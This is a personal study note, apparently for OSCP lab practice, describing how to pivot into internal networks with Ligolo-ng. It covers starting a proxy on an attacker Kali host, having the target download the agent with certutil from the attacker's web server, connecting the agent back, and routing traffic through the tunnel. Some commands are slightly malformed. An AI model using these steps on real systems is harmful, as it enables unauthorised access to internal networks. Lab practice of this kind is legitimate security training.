## 🔹 Step 0 — Identify Architecture

### Linux

```
uname -m
```

- `x86_64` → amd64
- `aarch64` → arm64
### Windows

**CMD**

```cmd
systeminfo | findstr /i "System Type
```

**PowerShell**

```powershell
$env:PROCESSOR_ARCHITECTURE
```

> ⚠️ Always match **agent/proxy binary architecture** to the target.

---

## 🔹 Step 1 — Download Ligolo Binaries

- **Attacker (Kali)** → `proxy`
- **Target (Pivot host)** → `agent`

🔗 Release:  
[https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2)

---

# Step 2 & 3 in KALI ATTACKER

## 🔹 Step 2 — Create the TUN interface and bring it up:

```
sudo ip tuntap add user kali mode tun ligolo
```

```
sudo ip link set dev ligolo up
```

## 🔹 Step 3 — Start the Ligolo proxy server

```
cd ~/Desktop/Tools/ligolo && ./proxy -laddr 0.0.0.0:11601 -selfcert
```

---
### ⚠️ Error: Device or resource busy

If you see:

`ioctl(TUNSETIFF): Device or resource busy`

Fix:

`ip a | grep ligolo sudo ip link set ligolo up`

Or reset:

```
sudo ip link delete ligolo
```

```
 sudo ip tuntap add user kali mode tun ligolo 
```
 
```
sudo ip link set ligolo up
```

> ℹ️ TUN interface only needs to be created **once per reboot**

---
## 🔹 Step 4 — Execute agent in TARGET

On KALI ATTACKER
```
cd ~/Desktop/Tools/ligolo && python -m http.server 80
```

Transfer agent.exe onto target > Outfile agent.exe

Windows AMD64 > WindowsAMD64Agent.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/WindowsAMD64Agent.exe agent.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Execute agent in target shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `agent.exe -connect ${KaliIP}:11601 -ignore-cert`;

dv.paragraph("```bash\n" + command + "\n```");
```

If restricted egress:

CMD
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `agent.exe -connect https://${KaliIP}:11601 -ignore-cert`;

dv.paragraph("```bash\n" + command + "\n```");
```

Expected output:

![[Pasted image 20260913102354.png]]

![[Pasted image 20260913102406.png]]

`[INFO] Agent connected from 10.129.42.56... session`

Leave this running.

---
## 🔹 Step 5 — Establish the Tunnel & Route Traffic

In the Ligolo proxy interface:

```
session
```

Type `1` to select the agent session, then type `start`:

In a new Kali terminal, route the internal network interface (typically `10.129.42.0/24` or loopback `127.0.0.1/32` for local development servers) through your `ligolo` interface:

Based off this : 
`[INFO] Agent connected from 10.129.42.56... session`
F
or

Inside Ligolo console:

```
ifconfig
```

Look for internal subnet (e.g. `172.16.5.0/23`)

in KALI TERMINAL, Add specific IP route
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo ip route add ${ip}/32 dev ligolo`;

dv.paragraph("```bash\n" + command + "\n```");
```
Verify:
```
ip route list
```

Fix : Delete route
```
sudo ip route del 10.129.42.0/24 dev ligolo
```


---

## 🔹 Step 9 — Verify Pivot

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ping ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
If ping works → pivot is **fully functional** ✅

---
